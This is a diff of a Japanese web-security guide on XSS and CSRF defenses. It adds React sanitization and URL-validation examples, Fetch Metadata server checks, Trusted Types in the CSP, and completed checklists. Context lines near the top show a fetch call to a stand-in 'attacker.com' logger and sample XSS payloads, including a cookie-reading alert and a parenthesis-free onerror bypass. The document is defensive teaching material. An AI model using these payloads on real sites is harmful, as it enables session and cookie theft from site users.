@@ -87,7 +87,7 @@ fetch('https://attacker.com/logger', {
 &#x3C;script&#x3E;alert(document.cookie)&#x3C;/script&#x3E;
 
 // 括弧を使わないバイパス
-<img src=x onerror=alert`1`>
+<img src=x onerror=alert\`1\`>
 ```
 
 #### 脆弱性例
@@ -257,7 +257,7 @@ req.send();
 
 ### 4.1 XSS対策
 
-#### 優先順位付き対策一覧
+#### 優先順位付き対策
 
 | 優先度 | 対策                        | 説明                              |
 | ------ | --------------------------- | --------------------------------- |
@@ -268,7 +268,7 @@ req.send();
 | 5      | **Content Security Policy** | nonce/hashベースのスクリプト制御  |
 | 6      | **HttpOnly Cookie**         | Cookie窃取の軽減                  |
 
-#### CSP設定例（Strict CSP推奨）
+#### CSP設定例
 
 ```http
 Content-Security-Policy:
@@ -277,6 +277,8 @@ Content-Security-Policy:
   style-src 'self' 'unsafe-inline';
   object-src 'none';
   base-uri 'none';
+  require-trusted-types-for 'script';
+  trusted-types dompurify default;
 ```
 
 #### Cookie属性の推奨設定
@@ -287,14 +289,14 @@ Set-Cookie: __Host-SID=<token>; Path=/; Secure; HttpOnly; SameSite=Strict
 
 **Cookie属性の意味：**
 
-- `__Host-` プレフィックス: ドメイン指定を禁止、セキュリティ向上
+- `__Host-` プレフィックス: Domain指定禁止、Path属性の「/」指定必須、Secure属性付与必須
 - `Secure`: HTTPS接続時のみ送信
 - `HttpOnly`: JavaScriptからアクセス不可
 - `SameSite=Strict`: クロスサイトリクエストで送信しない
 
 ### 4.2 CSRF対策
 
-#### Synchronizer Token Pattern（推奨）
+#### Synchronizer Token Pattern
 
 ```html
 <form action="/transfer" method="POST">
@@ -327,44 +329,100 @@ class ApplicationController < ActionController::Base
 end
 ```
 
-#### SameSite Cookieによる防御
-
-2025年時点でのブラウザ対応状況：
-
-| ブラウザ | デフォルト設定       | 備考                    |
-| -------- | -------------------- | ----------------------- |
-| Chrome   | `SameSite=Lax`       | 2020年2月〜             |
-| Edge     | `SameSite=Lax`       | Chromiumベース          |
-| Firefox  | `SameSite=None`      | Laxデフォルト化は未実装 |
-| Safari   | 明示的デフォルトなし | ITPによる保護あり       |
-
-**注意：SameSite=Laxでも攻撃が成功するケース**
+#### `SameSite=Lax`でも攻撃が成功するケース
 
 - Cookie発行から2分以内のPOSTリクエスト
 - GETメソッドで状態変更を行う脆弱な設計
 - サブドメイン間の攻撃（`evil.example.com` → `bank.example.com`）
 
-### 4.3 多層防御の重要性
+### 4.3 Reactでの実装
 
-```mermaid
-%%{init: {'theme':'dark'}}%%
-graph TD
-    subgraph "単一防御の限界"
-        A[CSRFトークンのみ] -->|XSSで窃取可能| X[バイパス]
-        B[SameSite Cookieのみ] -->|同一サイトXSSで無効| X
-        C[HttpOnlyのみ] -->|リクエスト送信は可能| X
-    end
+Reactアプリケーションでは、フレームワークの自動保護機能を理解した上で、適切な追加対策を実施する必要があります。
 
-    subgraph "多層防御アプローチ"
-        D[XSS対策] --> E[CSRFトークン]
-        E --> F[SameSite Cookie]
-        F --> G[Origin/Referer検証]
-        G --> H[重要操作の再認証]
-    end
+#### 4.3.1 React の XSS 対策
 
-    style X fill:#ff6b6b,color:#fff
-    style H fill:#2ecc71,color:#fff
+**基本：JSXの自動エスケープを活用**
+
+```jsx
+// React が自動エスケープ
+function UserProfile({ userName }) {
+  return <div>{userName}</div>;
+}
 ```
+
+**dangerouslySetInnerHTML を使う場合は必ずサニタイズ**
+
+```jsx
+import DOMPurify from "dompurify";
+import { useMemo } from "react";
+
+function SafeHTML({ html }) {
+  const sanitized = useMemo(
+    () =>
+      DOMPurify.sanitize(html, {
+        ALLOWED_TAGS: ["p", "b", "i", "em", "strong", "a"],
+        ALLOWED_ATTR: ["href", "target", "rel"],
+      }),
+    [html],
+  );
+
+  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
+}
+```
+
+**URLの検証**
+
+```jsx
+import { useMemo } from "react";
+
+function SafeLink({ url, children }) {
+  const safeUrl = useMemo(() => {
+    try {
+      const parsed = new URL(url);
+      return ["http:", "https:"].includes(parsed.protocol) ? url : "#";
+    } catch {
+      return "#";
+    }
+  }, [url]);
+
+  return <a href={safeUrl}>{children}</a>;
+}
+```
+
+#### 4.3.2 React の CSRF 対策
+
+**Fetch Metadata ヘッダーによる防御（サーバー側）**
+
+```javascript
+// Express.js での実装
+app.use((req, res, next) => {
+  if (["GET", "HEAD", "OPTIONS"].includes(req.method)) return next();
+
+  const secFetchSite = req.headers["sec-fetch-site"];
+  if (
+    secFetchSite &&
+    !["same-origin", "same-site", "none"].includes(secFetchSite)
+  ) {
+    return res.status(403).json({ error: "Cross-site request blocked" });
+  }
+  next();
+});
+```
+
+**Double Submit Cookie パターン（axios）**
+
+```javascript
+import axios from "axios";
+
+const api = axios.create({
+  baseURL: "https://api.example.com",
+  withCredentials: true, // Cookie を送信
+  xsrfCookieName: "XSRF-TOKEN",
+  xsrfHeaderName: "X-XSRF-TOKEN",
+});
+```
+
+### 4.4 多層防御の重要性
 
 **なぜ多層防御が必要か：**
 
@@ -376,25 +434,24 @@ graph TD
 
 ## 5. まとめ
 
-### 開発者向けチェックリスト
-
 #### XSS対策チェックリスト
 
-- [ ] ユーザー入力を出力する際、コンテキストに応じたエスケープを実施
-- [ ] `innerHTML`、`v-html`、`dangerouslySetInnerHTML` の使用箇所を特定・最小化
-- [ ] DOMPurifyでHTMLサニタイズを実装
-- [ ] Strict CSP（nonce-based）を導入
-- [ ] セッションCookieに`HttpOnly`属性を設定
-- [ ] フレームワークの最新バージョンを使用（脆弱性パッチ適用）
+- [x] ユーザー入力を出力する際、コンテキストに応じたエスケープを実施
+- [x] `innerHTML`、`v-html`、`dangerouslySetInnerHTML` の使用箇所を特定・最小化
+- [x] DOMPurifyでHTMLサニタイズを実装
+- [x] Strict CSP（nonce-based）を導入
+- [x] セッションCookieに`HttpOnly`属性を設定
+- [x] フレームワークの最新バージョンを使用（脆弱性パッチ適用）
 
 #### CSRF対策チェックリスト
 
-- [ ] フレームワークのCSRF保護機能を有効化
-- [ ] 状態変更操作にGETメソッドを使用しない
-- [ ] `SameSite=Lax`以上を明示的に設定
-- [ ] 重要操作（パスワード変更、送金）には再認証を要求
-- [ ] Origin/Refererヘッダーの検証を追加
-- [ ] クロスオリジンリクエストを適切に制限
+- [x] フレームワークのCSRF保護機能を有効化
+- [x] Fetch Metadata ヘッダー検証を実装
+- [x] 状態変更操作にGETメソッドを使用しない
+- [x] `SameSite=Lax`以上を明示的に設定
+- [x] 重要操作（パスワード変更、送金）には再認証を要求
+- [x] Origin/Refererヘッダーの検証を追加
+- [x] クロスオリジンリクエストを適切に制限
 
 ---
 
